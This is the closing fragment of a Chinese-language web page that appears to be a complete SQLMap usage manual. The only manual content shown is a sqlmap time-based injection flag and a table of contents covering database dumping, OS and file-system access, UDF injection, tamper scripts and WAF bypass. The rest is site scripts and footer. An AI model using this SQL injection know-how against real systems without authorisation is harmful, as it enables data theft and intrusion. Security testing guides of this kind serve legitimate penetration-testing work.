<span data-line><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">  --technique=T</span></span></code></pre></figure></article><hr/><div class="page-footer"></div></div><div class="right sidebar"><div class="graph"><h3>Graph View</h3><div class="graph-outer"><div class="graph-container" data-cfg="{&quot;drag&quot;:true,&quot;zoom&quot;:true,&quot;depth&quot;:1,&quot;scale&quot;:1.1,&quot;repelForce&quot;:0.5,&quot;centerForce&quot;:0.3,&quot;linkDistance&quot;:30,&quot;fontSize&quot;:0.6,&quot;opacityScale&quot;:1,&quot;showTags&quot;:true,&quot;removeTags&quot;:[],&quot;focusOnHover&quot;:false,&quot;enableRadial&quot;:false}"></div><button class="global-graph-icon" aria-label="Global Graph"><svg version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" viewBox="0 0 55 55" fill="currentColor" xml:space="preserve"><path d="M49,0c-3.309,0-6,2.691-6,6c0,1.035,0.263,2.009,0.726,2.86l-9.829,9.829C32.542,17.634,30.846,17,29,17
                s-3.542,0.634-4.898,1.688l-7.669-7.669C16.785,10.424,17,9.74,17,9c0-2.206-1.794-4-4-4S9,6.794,9,9s1.794,4,4,4
                c0.74,0,1.424-0.215,2.019-0.567l7.669,7.669C21.634,21.458,21,23.154,21,25s0.634,3.542,1.688,4.897L10.024,42.562
                C8.958,41.595,7.549,41,6,41c-3.309,0-6,2.691-6,6s2.691,6,6,6s6-2.691,6-6c0-1.035-0.263-2.009-0.726-2.86l12.829-12.829
                c1.106,0.86,2.44,1.436,3.898,1.619v10.16c-2.833,0.478-5,2.942-5,5.91c0,3.309,2.691,6,6,6s6-2.691,6-6c0-2.967-2.167-5.431-5-5.91
                v-10.16c1.458-0.183,2.792-0.759,3.898-1.619l7.669,7.669C41.215,39.576,41,40.26,41,41c0,2.206,1.794,4,4,4s4-1.794,4-4
                s-1.794-4-4-4c-0.74,0-1.424,0.215-2.019,0.567l-7.669-7.669C36.366,28.542,37,26.846,37,25s-0.634-3.542-1.688-4.897l9.665-9.665
                C46.042,11.405,47.451,12,49,12c3.309,0,6-2.691,6-6S52.309,0,49,0z M11,9c0-1.103,0.897-2,2-2s2,0.897,2,2s-0.897,2-2,2
                S11,10.103,11,9z M6,51c-2.206,0-4-1.794-4-4s1.794-4,4-4s4,1.794,4,4S8.206,51,6,51z M33,49c0,2.206-1.794,4-4,4s-4-1.794-4-4
                s1.794-4,4-4S33,46.794,33,49z M29,31c-3.309,0-6-2.691-6-6s2.691-6,6-6s6,2.691,6,6S32.309,31,29,31z M47,41c0,1.103-0.897,2-2,2
                s-2-0.897-2-2s0.897-2,2-2S47,39.897,47,41z M49,10c-2.206,0-4-1.794-4-4s1.794-4,4-4s4,1.794,4,4S51.206,10,49,10z"></path></svg></button></div><div class="global-graph-outer"><div class="global-graph-container" data-cfg="{&quot;drag&quot;:true,&quot;zoom&quot;:true,&quot;depth&quot;:-1,&quot;scale&quot;:0.9,&quot;repelForce&quot;:0.5,&quot;centerForce&quot;:0.2,&quot;linkDistance&quot;:30,&quot;fontSize&quot;:0.6,&quot;opacityScale&quot;:1,&quot;showTags&quot;:true,&quot;removeTags&quot;:[],&quot;focusOnHover&quot;:true,&quot;enableRadial&quot;:true}"></div></div></div><div class="toc desktop-only"><button type="button" class="toc-header" aria-controls="toc-16" aria-expanded="true"><h3>Table of Contents</h3><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="fold"><polyline points="6 9 12 15 18 9"></polyline></svg></button><ul id="list-1" class="toc-content overflow"><li class="depth-0"><a href="#sqlmap-完整使用手册" data-for="sqlmap-完整使用手册">SQLMap 完整使用手册</a></li><li class="depth-1"><a href="#一基础入门" data-for="一基础入门">一、基础入门</a></li><li class="depth-2"><a href="#11-sqlmap-概述" data-for="11-sqlmap-概述">1.1 SQLMap 概述</a></li><li class="depth-2"><a href="#12-sql注入基础" data-for="12-sql注入基础">1.2 SQL注入基础</a></li><li class="depth-1"><a href="#二目标参数设置" data-for="二目标参数设置">二、目标参数设置</a></li><li class="depth-2"><a href="#21-目标url参数" data-for="21-目标url参数">2.1 目标URL参数</a></li><li class="depth-2"><a href="#22-请求参数" data-for="22-请求参数">2.2 请求参数</a></li><li class="depth-2"><a href="#23-http头部设置" data-for="23-http头部设置">2.3 HTTP头部设置</a></li><li class="depth-2"><a href="#24-认证参数" data-for="24-认证参数">2.4 认证参数</a></li><li class="depth-1"><a href="#三注入参数配置" data-for="三注入参数配置">三、注入参数配置</a></li><li class="depth-2"><a href="#31-注入点指定" data-for="31-注入点指定">3.1 注入点指定</a></li><li class="depth-2"><a href="#32-注入技术选择" data-for="32-注入技术选择">3.2 注入技术选择</a></li><li class="depth-2"><a href="#33-注入配置优化" data-for="33-注入配置优化">3.3 注入配置优化</a></li><li class="depth-2"><a href="#34-注入边界设置" data-for="34-注入边界设置">3.4 注入边界设置</a></li><li class="depth-1"><a href="#四检测参数设置" data-for="四检测参数设置">四、检测参数设置</a></li><li class="depth-2"><a href="#41-检测级别" data-for="41-检测级别">4.1 检测级别</a></li><li class="depth-2"><a href="#42-风险等级" data-for="42-风险等级">4.2 风险等级</a></li><li class="depth-2"><a href="#43-检测选项" data-for="43-检测选项">4.3 检测选项</a></li><li class="depth-2"><a href="#44-注入点标记" data-for="44-注入点标记">4.4 注入点标记</a></li><li class="depth-1"><a href="#五指纹识别与枚举" data-for="五指纹识别与枚举">五、指纹识别与枚举</a></li><li class="depth-2"><a href="#51-指纹识别" data-for="51-指纹识别">5.1 指纹识别</a></li><li class="depth-2"><a href="#52-数据库枚举" data-for="52-数据库枚举">5.2 数据库枚举</a></li><li class="depth-2"><a href="#53-数据检索" data-for="53-数据检索">5.3 数据检索</a></li><li class="depth-2"><a href="#54-数据导出选项" data-for="54-数据导出选项">5.4 数据导出选项</a></li><li class="depth-1"><a href="#六高级功能" data-for="六高级功能">六、高级功能</a></li><li class="depth-2"><a href="#61-文件系统访问" data-for="61-文件系统访问">6.1 文件系统访问</a></li><li class="depth-2"><a href="#62-操作系统访问" data-for="62-操作系统访问">6.2 操作系统访问</a></li><li class="depth-2"><a href="#63-windows注册表操作" data-for="63-windows注册表操作">6.3 Windows注册表操作</a></li><li class="depth-2"><a href="#64-udf注入用户自定义函数" data-for="64-udf注入用户自定义函数">6.4 UDF注入（用户自定义函数）</a></li><li class="depth-1"><a href="#七性能优化" data-for="七性能优化">七、性能优化</a></li><li class="depth-2"><a href="#71-优化选项" data-for="71-优化选项">7.1 优化选项</a></li><li class="depth-2"><a href="#72-性能调优" data-for="72-性能调优">7.2 性能调优</a></li><li class="depth-2"><a href="#73-速度优化建议" data-for="73-速度优化建议">7.3 速度优化建议</a></li><li class="depth-1"><a href="#八绕过与规避" data-for="八绕过与规避">八、绕过与规避</a></li><li class="depth-2"><a href="#81-绕过技术" data-for="81-绕过技术">8.1 绕过技术</a></li><li class="depth-2"><a href="#82-常用tamper脚本详解" data-for="82-常用tamper脚本详解">8.2 常用Tamper脚本详解</a></li><li class="depth-2"><a href="#83-匿名与代理" data-for="83-匿名与代理">8.3 匿名与代理</a></li><li class="depth-2"><a href="#84-waf识别与绕过流程" data-for="84-waf识别与绕过流程">8.4 WAF识别与绕过流程</a></li><li class="depth-1"><a href="#九输出与报告" data-for="九输出与报告">九、输出与报告</a></li><li class="depth-2"><a href="#91-输出控制" data-for="91-输出控制">9.1 输出控制</a></li><li class="depth-2"><a href="#92-输出格式" data-for="92-输出格式">9.2 输出格式</a></li><li class="depth-2"><a href="#93-日志记录" data-for="93-日志记录">9.3 日志记录</a></li><li class="depth-2"><a href="#94-报告生成" data-for="94-报告生成">9.4 报告生成</a></li><li class="depth-1"><a href="#十实战案例与技巧" data-for="十实战案例与技巧">十、实战案例与技巧</a></li><li class="depth-2"><a href="#101-常用命令组合" data-for="101-常用命令组合">10.1 常用命令组合</a></li><li class="depth-2"><a href="#102-故障排查" data-for="102-故障排查">10.2 故障排查</a></li><li class="depth-1"><a href="#十一扩展与进阶" data-for="十一扩展与进阶">十一、扩展与进阶</a></li><li class="depth-2"><a href="#111-自定义开发" data-for="111-自定义开发">11.1 自定义开发</a></li><li class="depth-2"><a href="#112-防护与对抗" data-for="112-防护与对抗">11.2 防护与对抗</a></li><li class="overflow-end"></li></ul></div></div><footer class><p>Created with <a href="https://quartz.jzhao.xyz/">Quartz v4.5.1</a> © 2025</p><ul><li><a href="https://github.com/jackyzha0/quartz">GitHub</a></li><li><a href="https://discord.gg/cRFFHYye7t">Discord Community</a></li></ul></footer></div></div></body><script type="application/javascript">function n(){let t=this.parentElement;t.classList.toggle("is-collapsed");let e=t.getElementsByClassName("callout-content")[0];if(!e)return;let l=t.classList.contains("is-collapsed");e.style.gridTemplateRows=l?"0fr":"1fr"}function c(){let t=document.getElementsByClassName("callout is-collapsible");for(let e of t){let l=e.getElementsByClassName("callout-title")[0],s=e.getElementsByClassName("callout-content")[0];if(!l||!s)continue;l.addEventListener("click",n),window.addCleanup(()=>l.removeEventListener("click",n));let o=e.classList.contains("is-collapsed");s.style.gridTemplateRows=o?"0fr":"1fr"}}document.addEventListener("nav",c);
</script><script type="module">function f(i,e){if(!i)return;function r(o){o.target===this&&(o.preventDefault(),o.stopPropagation(),e())}function t(o){o.key.startsWith("Esc")&&(o.preventDefault(),e())}i?.addEventListener("click",r),window.addCleanup(()=>i?.removeEventListener("click",r)),document.addEventListener("keydown",t),window.addCleanup(()=>document.removeEventListener("keydown",t))}function y(i){for(;i.firstChild;)i.removeChild(i.firstChild)}var h=class{constructor(e,r){this.container=e;this.content=r;this.setupEventListeners(),this.setupNavigationControls(),this.resetTransform()}isDragging=!1;startPan={x:0,y:0};currentPan={x:0,y:0};scale=1;MIN_SCALE=.5;MAX_SCALE=3;cleanups=[];setupEventListeners(){let e=this.onMouseDown.bind(this),r=this.onMouseMove.bind(this),t=this.onMouseUp.bind(this),o=this.resetTransform.bind(this);this.container.addEventListener("mousedown",e),document.addEventListener("mousemove",r),document.addEventListener("mouseup",t),window.addEventListener("resize",o),this.cleanups.push(()=>this.container.removeEventListener("mousedown",e),()=>document.removeEventListener("mousemove",r),()=>document.removeEventListener("mouseup",t),()=>window.removeEventListener("resize",o))}cleanup(){for(let e of this.cleanups)e()}setupNavigationControls(){let e=document.createElement("div");e.className="mermaid-controls";let r=this.createButton("+",()=>this.zoom(.1)),t=this.createButton("-",()=>this.zoom(-.1)),o=this.createButton("Reset",()=>this.resetTransform());e.appendChild(t),e.appendChild(o),e.appendChild(r),this.container.appendChild(e)}createButton(e,r){let t=document.createElement("button");return t.textContent=e,t.className="mermaid-control-button",t.addEventListener("click",r),window.addCleanup(()=>t.removeEventListener("click",r)),t}onMouseDown(e){e.button===0&&(this.isDragging=!0,this.startPan={x:e.clientX-this.currentPan.x,y:e.clientY-this.currentPan.y},this.container.style.cursor="grabbing")}onMouseMove(e){this.isDragging&&(e.preventDefault(),this.currentPan={x:e.clientX-this.startPan.x,y:e.clientY-this.startPan.y},this.updateTransform())}onMouseUp(){this.isDragging=!1,this.container.style.cursor="grab"}zoom(e){let r=Math.min(Math.max(this.scale+e,this.MIN_SCALE),this.MAX_SCALE),t=this.content.getBoundingClientRect(),o=t.width/2,n=t.height/2,c=r-this.scale;this.currentPan.x-=o*c,this.currentPan.y-=n*c,this.scale=r,this.updateTransform()}updateTransform(){this.content.style.transform=`translate(${this.currentPan.x}px, ${this.currentPan.y}px) scale(${this.scale})`}resetTransform(){this.scale=1;let e=this.content.querySelector("svg");this.currentPan={x:e.getBoundingClientRect().width/2,y:e.getBoundingClientRect().height/2},this.updateTransform()}},C=["--secondary","--tertiary","--gray","--light","--lightgray","--highlight","--dark","--darkgray","--codeFont"],E;document.addEventListener("nav",async()=>{let e=document.querySelector(".center").querySelectorAll("code.mermaid");if(e.length===0)return;E||=await import("https://cdnjs.cloudflare.com/ajax/libs/mermaid/11.4.0/mermaid.esm.min.mjs");let r=E.default,t=new WeakMap;for(let n of e)t.set(n,n.innerText);async function o(){for(let s of e){s.removeAttribute("data-processed");let a=t.get(s);a&&(s.innerHTML=a)}let n=C.reduce((s,a)=>(s[a]=window.getComputedStyle(document.documentElement).getPropertyValue(a),s),{}),c=document.documentElement.getAttribute("saved-theme")==="dark";r.initialize({startOnLoad:!1,securityLevel:"loose",theme:c?"dark":"base",themeVariables:{fontFamily:n["--codeFont"],primaryColor:n["--light"],primaryTextColor:n["--darkgray"],primaryBorderColor:n["--tertiary"],lineColor:n["--darkgray"],secondaryColor:n["--secondary"],tertiaryColor:n["--tertiary"],clusterBkg:n["--light"],edgeLabelBackground:n["--highlight"]}}),await r.run({nodes:e})}await o(),document.addEventListener("themechange",o),window.addCleanup(()=>document.removeEventListener("themechange",o));for(let n=0;n<e.length;n++){let v=function(){let g=l.querySelector("#mermaid-space"),m=l.querySelector(".mermaid-content");if(!m)return;y(m);let w=c.querySelector("svg").cloneNode(!0);m.appendChild(w),l.classList.add("active"),g.style.cursor="grab",u=new h(g,m)},M=function(){l.classList.remove("active"),u?.cleanup(),u=null},c=e[n],s=c.parentElement,a=s.querySelector(".clipboard-button"),d=s.querySelector(".expand-button"),p=window.getComputedStyle(a),L=a.offsetWidth+parseFloat(p.marginLeft||"0")+parseFloat(p.marginRight||"0");d.style.right=`calc(${L}px + 0.3rem)`,s.prepend(d);let l=s.querySelector("#mermaid-container");if(!l)return;let u=null;d.addEventListener("click",v),f(l,M),window.addCleanup(()=>{u?.cleanup(),d.removeEventListener("click",v)})}});
</script><script src="https://cdn.jsdelivr.net/npm/katex@0.16.11/dist/contrib/copy-tex.min.js" type="application/javascript"></script><script src="../../postscript.js" type="module"></script></html>